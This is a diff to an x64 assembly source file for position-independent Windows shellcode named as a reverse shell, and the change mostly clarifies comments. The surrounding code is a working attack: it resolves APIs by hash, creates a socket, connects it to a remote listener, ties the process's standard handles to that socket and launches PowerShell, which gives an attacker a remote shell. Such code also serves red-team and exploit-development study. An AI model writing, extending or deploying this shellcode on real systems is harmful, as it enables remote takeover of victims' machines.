@@ -6,6 +6,8 @@
 ; Assemble: nasm -f win64 pic-reverse-shell.x64.asm
 ; Link: link.exe /subsystem:console /entry:main pic-reverse-shell.x64.obj
 ; 
+; Tested on:
+;   - Windows 10 Pro 22H2 19045.6466
 bits 64
 default rel
 global main
@@ -34,9 +36,9 @@ main:
     mov edx, 0x1000          ; edx = 0x1000 (dwSize)
     mov r8d, 0x1000          ; r8d = 0x1000 MEM_COMMIT
     or r8d, 0x2000           ; r8d = MEM_COMMIT | MEM_RESERVE (flAllocationType)
-    mov r9d, 0x04            ; r9d = PAGE_READWRITE | lpProtect
+    mov r9d, 0x04            ; r9d = PAGE_READWRITE (lpProtect)
     sub rsp, 0x28
-    call rax                 ; VirtualAlloc
+    call rax                 ; VirtualAlloc(0, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
     mov r15, rax             ; r15 = VirtualAlloc buffer
     add rsp, 0x28
     
@@ -45,7 +47,7 @@ main:
     mov rcx, r12             ; rcx = kernel32.dll base address
     mov rdx, 0x5FBFF0FB      ; rdx = LoadLibraryA
     sub rsp, 0x28
-    call getprocaddress      ; GetProcAddress()
+    call getprocaddress      ; GetProcAddress(kernel32.dll, LoadLibraryA)
     add rsp, 0x28
     lea rcx, [ws2_32]        ; rcx = &"ws2_32.dll"
     sub rsp, 0x28
@@ -71,7 +73,7 @@ main:
     mov rcx, r14             ; rcx = ws2_32.dll base address
     mov rdx, 0x559F159A      ; rdx = WSASocket
     sub rsp, 0x28
-    call getprocaddress      ; GetProcAddress()
+    call getprocaddress      ; GetProcAddress(ws2_32.dll, WSASocket)
     add rsp, 0x28
     mov rcx, 0x02            ; rcx = 2 (af)
     mov edx, 0x1             ; rdx = 1 (type)
@@ -80,7 +82,7 @@ main:
     sub rsp, 0x28            ; Add shadow space, then add parameters
     mov dword [rsp + 0x20], 0; (g = 0)
     mov dword [rsp + 0x28], 0; (dwFlags = 0)
-    call rax                 ; WSASocketA()
+    call rax                 ; WSASocketA(2, 1, 6, 0, 0, 0)
     add rsp, 0x28
 
     ; Step 5: Connect to the listener with WSAConnect
@@ -105,7 +107,7 @@ main:
     mov qword [rsp + 0x20], 0           ; lpCalleeData = 0
     mov qword [rsp + 0x28], 0           ; lpSQOS = 0
     mov qword [rsp + 0x30], 0           ; lpGQOS = 0
-    call rax                            ; WSAConnect()
+    call rax                            ; WSAConnect(rcx, rdx, 16, 0, 0, 0, 0)
     add rsp, 0x28
 
     ; Step 6: Connect STARTUPINFOA structure to the network socket
@@ -142,7 +144,7 @@ main:
     mov rsi, r15                    ; rsi = &STARTUPINFOA
     add rsi, 0x68                   ; rsi = &PROCESS_INFORMATION
     mov qword [rsp + 0x48], rsi     ; lpProcessInformation = &PROCESS_INFORMATION 
-    call rax                        ; CreateProcessA()
+    call rax                        ; CreateProcessA(0, "powershell", 0, 0, TRUE, 0, 0, &STARTUPINFOA, &PROCESS_INFORMATION)
     add rsp, 0x58
 
     ; Step 8: Cleanly exit the thread
@@ -150,11 +152,10 @@ main:
     mov rcx, [rsp + 0x10]           ; rcx = ntdll.dll base address
     mov rdx, 0x8E492B88             ; rdx = RtlExitUserThread
     sub rsp, 0x28                 
-    call getprocaddress             ; GetProcAddress
+    call getprocaddress             ; GetProcAddress(ntdll.dll, RtlExitUserThread)
     xor rcx, rcx                    ; rcx = 0
     call rax                        ; RtlExitUserThread(0)
     ret
-
 
 ; __stdcall* GetProcAddress(HMODULE hModule, DWORD Hash)
 ;                           rcx   = hModule, rdx=Hash
